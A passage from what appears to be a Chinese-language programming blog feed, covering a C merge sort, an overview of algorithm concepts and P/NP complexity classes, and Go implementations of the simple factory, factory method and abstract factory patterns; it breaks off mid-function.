class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> left, <span class="type">int</span> mid, <span class="type">int</span> right)</span> &#123;</span><br><span class="line"><span class="type">int</span> i = left, j = mid + <span class="number">1</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span>* b = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (right - left + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= right) &#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] &lt;= a[j])</span><br><span class="line">b[k++] = a[i++];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">b[k++] = a[j++];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (i &lt;= mid)</span><br><span class="line">b[k++] = a[i++];</span><br><span class="line"><span class="keyword">while</span> (j &lt;= right)</span><br><span class="line">b[k++] = a[j++];</span><br><span class="line"><span class="keyword">for</span> (i = left, k = <span class="number">0</span>; i &lt;= right; ++i)</span><br><span class="line">a[i] = b[k++];</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_sort</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line"><span class="comment">//5(0-4)-&gt;3(0-2)|2(3-4)</span></span><br><span class="line"><span class="keyword">if</span> (left == right)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="type">int</span> mid = (right + left) / <span class="number">2</span>;</span><br><span class="line">merge_sort(a, left, mid);</span><br><span class="line">merge_sort(a, mid + <span class="number">1</span>, right);</span><br><span class="line">merge(a, left, mid, right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n, a[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">merge_sort(a, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 分治算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法概述</title>
      <link href="/202421c92d70c1ef/"/>
      <url>/202421c92d70c1ef/</url>
      
        <content type="html"><![CDATA[<h1 id="算法定义与设计思想">算法定义与设计思想</h1><h2 id="算法的定义">算法的定义</h2><p><code>算法</code>是指解决问题的一种方法或一个过程。<br><code>算法</code>是若干指令的<strong>有穷序列</strong>，满足以下性质：</p><ol><li>输入：有外部提供的量作为算法的输入</li><li>输出：算法产生<strong>至少一个量</strong>作为输出—算法必须有结果</li><li>确定性：组成算法的每条指令是<strong>清晰，无歧义</strong>的</li><li>有限性：算法中每条指令的执行次数是<strong>有限的</strong>，执行每条指令的时间也是<strong>有限的</strong></li></ol><h2 id="算法设计的重要思想">算法设计的重要思想</h2><ol><li>边界思想：算法的设计需要首先满足边界条件（一般指输入数据的范围限制，包括一些特殊情况以及异常等，都要考虑在内，以提高算法的健壮性）</li><li>覆盖思想：算法要考虑到问题中所有的可能性，以确保各种情况下算法都能正常工作</li><li>奥卡姆剃刀：如无必要，勿增实体。（优先选择最为简单且基本的解决方案，本质上是复杂度）</li><li>没有免费的午餐：不存在一个通用的最优算法能够在所有可能的问题上表现最佳。（空间和时间的交换？）</li></ol><h1 id="问题分类">问题分类</h1><h2 id="多项式时间">多项式时间</h2><p>复杂度的问题规模n出现在底数的位置，就是<code>多项式级复杂度</code>。<br>而例如<code>O(a^n)</code>和<code>O(n!)</code>等，就是<code>非多项式级复杂度</code>，计算机往往无法接受。</p><h2 id="确定性与非确定性算法">确定性与非确定性算法</h2><h2 id="确定性算法">确定性算法</h2><p>设A是求解问题B的一个解决算法，在算法的整个执行过程中，每一步都能得到一个确定的解，这样的算法就是确定性算法。</p><h2 id="非确定性算法">非确定性算法</h2><p>设A是求解问题B的一个解决算法，它将问题分解成两部分，分别为猜测阶段和验证阶段，其中</p><ol><li>猜测阶段：在这个阶段，对问题的一个特定的输入实例x产生一个任意字符串y，在算法的每一次运行时，y的值可能不同，因此，猜测以一种非确定的形式工作。</li><li>验证阶段：在这个阶段，用一个确定性算法（有限时间内）验证。<ol><li>检查在猜测阶段产生的y是否是合适的形式，如果不是，则算法停下来并得到no；</li><li>如果y是合适的形式，则验证它是否是问题的解，如果是，则算法停下来并得到yes，否则算法停下来并得到no。它是验证所猜测的解的正确性。</li></ol></li></ol><h2 id="规约-约化">规约/约化</h2><p>问题A可以约化为问题B，称为“问题A可规约为问题B”。</p><p>可以理解为问题B的解一定就是问题A的解，因此解决A不会难于解决B。由此可知问题B的时间复杂度一定 &gt;= 问题A。</p><h2 id="问题分类">问题分类</h2><ol><li><code>P类问题</code>：能在多项式时间内可解的问题。</li><li><code>NP类问题</code>：在多项式时间内“可验证”的问题。<br>也就是说，不能判定这个问题到底有没有解，而是猜出一个解来在多项式时间内证明这个解是否正确。即该问题的猜测过程是不确定的，而对其某一个解的验证则能够在多项式时间内完成。P类问题属于NP问题，但NP类问题不一定属于P类问题。</li><li><code>NPC问题</code>：存在这样一个NP问题，所有的NP问题都可以约化成它。<br>换句话说，只要解决了这个问题，那么所有的NP问题都解决了。其定义要满足2个条件：<ol><li>它是一个NP问题</li><li>所有NP问题都能规约到它</li></ol></li><li><code>NP-hard问题</code>：NP-hard问题是这样一种问题，它满足NPC问题定义的第二条但不一定要满足第一条（就是说，NP-hard问题要比 NPC问题的范围广，NP-hard问题没有限定属于NP），即所有的NP问题都能约化到它，但是他不一定是一个NP问题。NP-hard问题同样难以找到多项式的算法，但它不列入我们的研究范围，因为它不一定是NP问题。即使NPC问题发现了多项式级的算法，NP-Hard问题有可能仍然无法得到多项式级的算法。事实上，由于NP-hard放宽了限定条件，它将有可能比所有的NPC问题的时间复杂度更高从而更难以解决。</li></ol><p>通常的计算机，都是确定性（deterministic）的。它们在同一个时刻，只有一种行为。如果用程序来表示，那么它们遇到一个条件判断（分支）的时候，只能一次探索其中一条路径。<br>P = “确定性计算机”能够在“多项式时间”解决的所有问题<br>NP = “非确定性计算机”能够在“多项式时间”解决的所有问题</p><h1 id="五大算法">五大算法</h1><p>包括<code>分治算法</code>、<code>动态规划算法</code>、<code>贪心算法</code>、<code>回溯算法</code>、<code>分支界限法</code>。</p><p>注：本文参考自课程ppt</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工厂模式</title>
      <link href="/20248b8ae9aa7e8b/"/>
      <url>/20248b8ae9aa7e8b/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>在<code>工厂模式</code>中，使用一个公共的接口来创建对象，将创建逻辑封装在工厂类中，由工厂类负责各种对象的实例化。</p><p>工厂模式有如下优点：</p><ol><li>若创建逻辑可能有所变动，将其封装在独立的工厂类中，可以实现代码复用。</li><li>创建逻辑不会暴露给调用者，亦即调用者无需了解创建对象的细节，实现对象的创建与使用之间的解耦合。</li><li>将创建逻辑抽离出来，使各函数职能专一化，简化代码。</li></ol><p><code>工厂模式</code>一般细分为三种具体的类型：<code>简单工厂</code>、<code>工厂方法</code>、<code>抽象工厂</code>，其抽象度依次提高。</p><h1 id="简单工厂模式">简单工厂模式</h1><h2 id="定义">定义</h2><p>简单工厂模式（不属于23种设计模式）使用一个<code>工厂类</code>，该类根据参数的不同返回不同类型的实例，一般情况下被创建的实例往往拥有相同的父类（或实现了相同的接口）。<br>此外，由于简单工厂模式使用静态的工厂方法，因此又称为<code>静态工厂模式</code>。</p><h2 id="优点">优点</h2><ul><li>根据传入的不同参数，工厂类可以动态地选择创建哪种实例，调用方只需要负责”消费“即可。</li></ul><h2 id="缺点">缺点</h2><ul><li>工厂类扩展困难，一旦需要新增产品就必须修改工厂类的逻辑，违反了<strong>开闭原则</strong>。（对扩展开放，对修改关闭）。</li><li>随着产品种类的增多，简单工厂会变得愈加臃肿，为了解决这个问题，产生出了<code>抽象工厂</code>模式。</li></ul><h2 id="代码实现">代码实现</h2><p>与C++，Java等语言不同，Go语言没有构造函数，所以一般使用NewXxx函数来实现简单工厂，通过返回一个接口来实例化对象。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> factory  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// ConfigParser interfacetype ConfigParser interface &#123;  </span></span><br><span class="line">    Parse(data []<span class="type">byte</span>)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// JsonConfigParser json config parsertype JsonConfigParser struct&#123;&#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// Parse parse json configfunc (j JsonConfigParser) Parse(data []byte) &#123;  </span></span><br><span class="line">    <span class="comment">// parse json  </span></span><br><span class="line">    fmt.Println(<span class="string">&quot;implement json config parser&quot;</span>)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// YamlConfigParser yaml config parsertype YamlConfigParser struct&#123;&#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// Parse parse yaml configfunc (y YamlConfigParser) Parse(data []byte) &#123;  </span></span><br><span class="line">    <span class="comment">// parse yaml  </span></span><br><span class="line">    fmt.Println(<span class="string">&quot;implement yaml config parser&quot;</span>)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// XmlConfigParser xml config parsertype XmlConfigParser struct&#123;&#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// Parse parse xml configfunc (x XmlConfigParser) Parse(data []byte) &#123;  </span></span><br><span class="line">    <span class="comment">// parse xml  </span></span><br><span class="line">    fmt.Println(<span class="string">&quot;implement xml config parser&quot;</span>)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// NewConfigParser create config parser by typefunc NewConfigParser(t string) ConfigParser &#123;  </span></span><br><span class="line">    <span class="keyword">switch</span> t &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;json&quot;</span>:  </span><br><span class="line">       <span class="keyword">return</span> JsonConfigParser&#123;&#125;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;yaml&quot;</span>:  </span><br><span class="line">       <span class="keyword">return</span> YamlConfigParser&#123;&#125;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;xml&quot;</span>:  </span><br><span class="line">       <span class="keyword">return</span> XmlConfigParser&#123;&#125;  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> factory  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;reflect&quot;</span>    <span class="string">&quot;testing&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestNewConfigParser</span><span class="params">(t *testing.T)</span></span> &#123;  </span><br><span class="line">    tests := []<span class="keyword">struct</span> &#123;  </span><br><span class="line">       name <span class="type">string</span>  </span><br><span class="line">       want ConfigParser  </span><br><span class="line">    &#125;&#123;  </span><br><span class="line">       &#123;name: <span class="string">&quot;json&quot;</span>, want: JsonConfigParser&#123;&#125;&#125;,  </span><br><span class="line">       &#123;name: <span class="string">&quot;xml&quot;</span>, want: XmlConfigParser&#123;&#125;&#125;,  </span><br><span class="line">       &#123;name: <span class="string">&quot;yaml&quot;</span>, want: YamlConfigParser&#123;&#125;&#125;,  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">for</span> _, tt := <span class="keyword">range</span> tests &#123;  </span><br><span class="line">       t.Run(tt.name, <span class="function"><span class="keyword">func</span><span class="params">(t *testing.T)</span></span> &#123;  </span><br><span class="line">          <span class="keyword">if</span> got := NewConfigParser(tt.name); !reflect.DeepEqual(got, tt.want) &#123;  </span><br><span class="line">             t.Errorf(<span class="string">&quot;NewConfigParser() = %v, want %v&quot;</span>, got, tt.want)  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="工厂方法模式">工厂方法模式</h1><h2 id="定义">定义</h2><p>工厂方法模式（Factory Method）又称多态性工厂模式，属于23种设计模式的创建型模式。工厂方法模式定义了一个创建对象的“接口”，由实现这个接口的工厂类（子类）决定实例化哪个产品类，将类的实例化推迟到子类中进行。</p><p>原先的工厂不再负责具体的实例化，仅负责给出具体工厂子类必须实现的接口。</p><h2 id="优点">优点</h2><ul><li>扩展性高，当需要新增一个产品时，只要扩展一个工厂类即可，符合<code>开闭原则</code>。</li><li>用户只需要关心产品对应的工厂即可，无需关心创建细节。</li><li>在产品创建细节复杂的时候，将其分离到单独的具体工厂中，不至于让单个工厂类的逻辑过于复杂。</li></ul><h2 id="缺点">缺点</h2><ul><li>在增加产品时，要同时增加产品类和对应的具体工厂类，这会使类的数量过多，系统的复杂度增高。</li><li>只能生产一类产品，如果需要生产多种不同类的产品，请使用<code>抽象工厂模式</code>。</li></ul><h2 id="代码实现">代码实现</h2><p>很遗憾，Golang没有“继承”这一概念，在Go中实现“工厂方法模式”，采用让具体工厂类直接实现工厂接口的方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> factory  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 产品类实现位于simple_factory.go文件中  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// ConfigParserFactory 工厂方法接口  </span></span><br><span class="line"><span class="keyword">type</span> ConfigParserFactory <span class="keyword">interface</span> &#123;  </span><br><span class="line">    Create() ConfigParser  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// JsonConfigParserFactory 实现工厂方法接口的具体工厂  </span></span><br><span class="line"><span class="keyword">type</span> JsonConfigParserFactory <span class="keyword">struct</span>&#123;&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Create 具体工厂的创建方法  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f JsonConfigParserFactory)</span></span> Create() ConfigParser &#123;  </span><br><span class="line">    <span class="keyword">return</span> JsonConfigParser&#123;&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// YamlConfigParserFactory 实现工厂方法接口的具体工厂  </span></span><br><span class="line"><span class="keyword">type</span> YamlConfigParserFactory <span class="keyword">struct</span>&#123;&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Create 具体工厂的创建方法  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f YamlConfigParserFactory)</span></span> Create() ConfigParser &#123;  </span><br><span class="line">    <span class="keyword">return</span> YamlConfigParser&#123;&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// XmlConfigParserFactory 实现工厂方法接口的具体工厂  </span></span><br><span class="line"><span class="keyword">type</span> XmlConfigParserFactory <span class="keyword">struct</span>&#123;&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Create 具体工厂的创建方法  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f XmlConfigParserFactory)</span></span> Create() ConfigParser &#123;  </span><br><span class="line">    <span class="keyword">return</span> XmlConfigParser&#123;&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> factory  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;testing&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestConfigParserFactory</span><span class="params">(t *testing.T)</span></span> &#123;  </span><br><span class="line">    tests := []<span class="keyword">struct</span> &#123;  </span><br><span class="line">       name    <span class="type">string</span>  </span><br><span class="line">       factory ConfigParserFactory  </span><br><span class="line">       want    ConfigParser  </span><br><span class="line">    &#125;&#123;  </span><br><span class="line">       &#123;name: <span class="string">&quot;json&quot;</span>, factory: JsonConfigParserFactory&#123;&#125;, want: JsonConfigParser&#123;&#125;&#125;,  </span><br><span class="line">       &#123;name: <span class="string">&quot;xml&quot;</span>, factory: YamlConfigParserFactory&#123;&#125;, want: YamlConfigParser&#123;&#125;&#125;,  </span><br><span class="line">       &#123;name: <span class="string">&quot;yaml&quot;</span>, factory: XmlConfigParserFactory&#123;&#125;, want: XmlConfigParser&#123;&#125;&#125;,  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">for</span> _, tt := <span class="keyword">range</span> tests &#123;  </span><br><span class="line">       got := tt.factory.Create()  </span><br><span class="line">       <span class="keyword">if</span> got != tt.want &#123;  </span><br><span class="line">          t.Errorf(<span class="string">&quot;%s Create() = %v, want %v&quot;</span>, tt.name, got, tt.want)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="抽象工厂模式">抽象工厂模式</h1><h2 id="定义">定义</h2><p>抽象工厂模式（Abstract Factory）提供一个创建一系列相关或相互依赖对象的接口，而无须指定所要产品的具体类。</p><h2 id="举例">举例</h2><p>考虑一个生产家具的场景：</p><ul><li>我们需要关注3种产品：椅子、茶几、沙发</li><li>这3种产品必须配套：必须均为简约风格、美式风格或日式风格</li><li>同一种风格的产品在一起生产（显而易见的道理）</li><li>用户往往只关心某一套风格的家具的订购和使用</li></ul><p>现在考虑如何实现上述要求：</p><ol><li>首先，需要声明<code>抽象工厂</code>，该工厂包含所有产品的构造方法的接口。<br>例如：<code>CreateChair</code>、<code>CreateSofa</code>、<code>CreateCoffee­Table</code><br>这些方法返回<code>抽象产品</code>，即他们无论风格如何，都是椅子、茶几或沙发。</li><li>现在基于不同风格，但是成套的产品，分别声明其<code>具体工厂</code>，这些工厂分别负责生产某一风格的一套家具。<br>例如：现代家具工厂<code>Modern­Furniture­Factory</code>只能创建现代椅子<code>Modern­Chair</code> 、​现代沙发<code>Modern­Sofa</code> 和现代咖啡桌<code>Modern­Coffee­Table</code>产品；其他工厂类似。<br><code>具体工厂</code>负责生产<code>具体产品</code>以供用户使用。</li><li>接下来，用户只需要看重某一风格的家具即可成套购买。<br>用户无需关心具体的工厂类，他们只关心自己要获取的是一套家具而已。<br>至于家具如何生产，那是工厂要干的事。。。</li></ol><p>另外，显然用户明确知道家具（<code>抽象产品</code>）是干什么的——可以坐下、放茶杯等等，即抽象产品实现了哪些方法。<br>还有一件事，由于用户只关心抽象接口，因此需要根据配置文件等信息来选择具体工厂。</p><h2 id="抽象工厂实现">抽象工厂实现</h2><p>根据上面的例子进行抽象：</p><ul><li>产品族：即彼此之间有一定联系的产品，例如上例中的椅子、茶几或沙发共同组成一套家具。</li><li>不同等级产品：即同族中，各个不同的产品，例如同一风格的椅子、茶几或沙发属于3个不同等级的产品。<br>接下来实现整体的抽象工厂模式：</li><li>抽象工厂（Abstract Factory）：提供了创建抽象产品的接口，它包含多个创建产品的方法，可以创建多个不同等级的产品。</li><li>具体工厂（Concrete Factory）：实现抽象工厂中的多个抽象方法，完成具体产品的创建。</li><li>抽象产品（Product）：定义产品的规范，描述产品的功能接口，抽象工厂可以创建多个抽象产品。</li><li>具体产品（ConcreteProduct）：实现了抽象产品所定义的接口，由具体工厂来创建。</li></ul><h2 id="优点">优点</h2><ul><li>同一工厂生产的产品相互匹配，即属于同一族。</li><li>客户端无需关心创建细节，通过抽象接口操作实例。</li><li>满足<code>开闭原则</code>： 向程序中引入新产品时，无需修改客户端代码。</li></ul><h2 id="缺点">缺点</h2><ul><li>代码结构愈加复杂。</li><li>新产品的加入非常困难：抽象工厂确定了产品集合，并且规定了工厂接口，新增产品涉及到所有工厂的接口扩展。</li></ul><h2 id="代码实现">代码实现</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> factory</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************</span></span><br><span class="line"><span class="comment"> * Abstract products and abstract factory</span></span><br><span class="line"><span class="comment"> ******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Chair is an abstract product</span></span><br><span class="line"><span class="keyword">type</span> Chair <span class="keyword">interface</span> &#123;</span><br><span class="line">    Sit()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Table is an abstract product</span></span><br><span class="line"><span class="keyword">type</span> Table <span class="keyword">interface</span> &#123;</span><br><span class="line">    PutDown()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sofa is an abstract product</span></span><br><span class="line"><span class="keyword">type</span> Sofa <span class="keyword">interface</span> &#123;</span><br><span class="line">    Sit()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FurnitureFactory is an abstract factory</span></span><br><span class="line"><span class="keyword">type</span> FurnitureFactory <span class="keyword">interface</span> &#123;</span><br><span class="line">    CreateChair() Chair</span><br><span class="line">    CreateTable() Table</span><br><span class="line">    CreateSofa() Sofa</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************</span></span><br><span class="line"><span class="comment"> * Concrete products and concrete factory of modern furniture</span></span><br><span class="line"><span class="comment"> ******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ModernChair is a concrete product of modern furniture</span></span><br><span class="line"><span class="keyword">type</span> ModernChair <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c ModernChair)</span></span> Sit() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Sitting on modern chair&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ModernTable is a concrete product of modern furniture</span></span><br><span class="line"><span class="keyword">type</span> ModernTable <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t ModernTable)</span></span> PutDown() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Putting down modern table&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ModernSofa is a concrete product of modern furniture</span></span><br><span class="line"><span class="keyword">type</span> ModernSofa <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s ModernSofa)</span></span> Sit() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Sitting on modern sofa&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ModernFurnitureFactory is a concrete factory</span></span><br><span class="line"><span class="keyword">type</span> ModernFurnitureFactory <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f ModernFurnitureFactory)</span></span> 